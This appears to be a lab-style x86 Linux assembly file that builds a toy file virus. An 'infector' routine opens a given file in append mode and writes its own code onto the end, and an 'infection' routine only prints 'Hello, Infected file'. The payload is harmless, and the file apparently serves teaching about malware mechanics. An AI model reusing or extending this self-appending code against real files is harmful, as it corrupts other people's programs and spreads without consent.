section .data
hello_infected: db "Hello, Infected file",10,0

section .text
global _start
global system_call
global infector
global infection
global code_start
global code_end

extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    infection:
        push ebp       
        mov ebp,esp
        pushad
        pushfd
        mov eax,4 ;sys_write
        mov ebx, 1 ;stdout
        mov ecx, hello_infected ; insert location in memory
        mov edx, 22 ; length of the string
        int 0x80
        popfd
        popad
        pop ebp
        ret
    infector:
        push ebp
        mov ebp,esp
        sub esp,4
        pushad
        pushfd
        mov eax, 5 ;sys_open
        mov ebx, [ebp+8] ; file_name
        mov ecx, 1025 ; append
        mov edx, 511
        int 0x80
        mov [ebp -4], eax ; save file descriptor
        mov eax,4 ;sys_write
        mov ebx, [ebp-4] ; file descriptor
        mov ecx, code_start
        mov edx, 99
        int 0x80
        mov eax, 6
        mov ebx, [ebp-4]
        int 0x80
        popfd
        popad
        add esp, 4
        pop ebp
        ret
code_end:




